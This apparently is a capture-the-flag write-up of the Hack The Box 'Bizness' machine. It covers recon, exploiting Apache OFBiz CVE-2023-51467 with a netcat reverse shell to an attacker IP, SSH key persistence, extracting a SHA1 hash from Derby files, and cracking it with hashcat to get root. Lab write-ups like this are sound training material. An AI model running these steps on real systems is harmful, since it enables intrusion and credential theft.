# Bizness

![image](https://gist.github.com/assets/56447720/6de2b1ec-9718-415f-8bb4-30cfab5f6a4d)

## Recon

### port scan

```bash

PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
<<--snipped-->>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp    open  http       syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   syn-ack nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27
| SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50
| -----BEGIN CERTIFICATE-----
| MIIDbTCCAlWgAwIBAgIUcNuUwJFmLYEqrKfOdzHtcHum2IwwDQYJKoZIhvcNAQEL
<<--snipped-->>
| c1zAVUdnau5FQSAbwjDg0XqRrs1otS0YQhyMw/3D8X+f/vPDN9rFG8l9Q5wZLmCa
| zj1Tly1wsPCYAq9u570e22U=
|_-----END CERTIFICATE-----
| tls-alpn:
|_  http/1.1
|_http-server-header: nginx/1.18.0
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-favicon: Unknown favicon MD5: 7CF35F0B3566DB84C7260F0CC357D0B8
| tls-nextprotoneg:
|_  http/1.1
36197/tcp open  tcpwrapped syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### directory scan

```bash

 ffuf -u https://bizness.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -fs 0
```

* directory scan reveals `/control`
* upon visiting we get a apache ofbiz page, with some error.

## Initial foothold

* After googling, I found that the server is vulnerable to CVE-2023-51467
* read more : https://nvd.nist.gov/vuln/detail/CVE-2023-51467
* github poc : https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass

## User shell

* Running the script we get a user shell

```bash

➜  Apache-OFBiz-Authentication-Bypass git:(master) python3 exploit.py --url https://bizness.htb --cmd 'nc <YOUR IP> <PORT> -e /bin/sh'
```

### Stabalizing shell

* I made .ssh keys inside $HOME directory to get a stablize shell

```bash

mkdir ~/.ssh
chmod 700 ~/.ssh

#create public key with : ssh-keygen -t rsa -b 2048
echo '<your public key>' > ~/.ssh/authorized_keys

chmod 600 ~/.ssh/authorized_keys
#done
```

#### now simply ssh

```bash

➜  Apache-OFBiz-Authentication-Bypass git:(master) ssh ofbiz@bizness.htb
The authenticity of host 'bizness.htb (10.129.176.140)' can't be established.
ED25519 key fingerprint is SHA256:Yr2plP6C5tZyGiCNZeUYNDmsDGrfGijissa6WJo0yPY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bizness.htb' (ED25519) to the list of known hosts.
Linux bizness 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

ofbiz@bizness:~$ cat user.txt
b7c9d<--snipped-->b6a1997
ofbiz@bizness:~$


```

## Root shell

* so i tried linpeas.sh, didn't found much info
* found a rabbit hole for python capability
* (asked for nudge)
* they told to see how the app stores password
* Next thing I did was to find db files, found `derby` directory, which is a database used in Apache
* used grep to find password logs
* if you read the program, you'll see it's using sha1 for hashing, searched for "sha"
* program : https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java

```bash

ofbiz@bizness:/opt/ofbiz/runtime/data$ grep -irl "sha"
derby/ofbiz/seg0/c5490.dat
derby/ofbiz/seg0/c54a1.dat
derby/ofbiz/seg0/c5c70.dat
derby/ofbiz/seg0/c54d0.dat
derby/ofbiz/seg0/c23f0.dat
derby/ofbiz/seg0/c10.dat
derby/ofbiz/seg0/c6650.dat
derby/ofbiz/seg0/c1330.dat
derby/ofbiz/seg0/c2590.dat
derby/ofbiz/seg0/c1310.dat
derby/ofbiz/log/log31.dat
derby/ofbizolap/seg0/c10.dat
derby/ofbiztenant/seg0/c10.dat
ofbiz@bizness:/opt/ofbiz/runtime/data$ 

```

* used strings on those .dat files

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data$ strings derby/ofbiz/log/log31.dat | grep -i "sha"
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I!!
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I!!
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I!!
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I

```

#### Hash

`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

* if you read the prgm, it's mentioned that the hash is url safe base encoded....
* so `uP0_QaVBpDWFeo8-dRzDqRwXQ2I` urlsafe base64 deocde this
* then hex it
* salt is `d` (see the hash)
* cyber chef url : `https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true,false)To_Hex('None',0)&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ`
* add hash & salt in a file & give it to hashcat
* `hash:salt`

### Hash crack

```bash
└─# hashcat -a 0 -m 120 bizness-hash.htb ../wordlists/rockyou.txt
hashcat (v6.2.6) starting

<<snip>>

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

<<snip>>

Dictionary cache built:
* Filename..: ../wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

b8fd3f41a541a435857a8f3e751cc3a91c174362:d:<snip>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 120 (sha1($salt.$pass))
Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
Time.Started.....: Sun Jan  7 14:28:17 2024 (0 secs)
 <<snip>>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: mosnarak -> meisgay1
Hardware.Mon.#1..: Util: 30%

Started: Sun Jan  7 14:27:59 2024
Stopped: Sun Jan  7 14:28:17 2024

```

### rooted

```bash
ofbiz@bizness:~$ su
Password:
root@bizness:/home/ofbiz# id
uid=0(root) gid=0(root) groups=0(root)
root@bizness:/home/ofbiz#
```

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes's still pwning
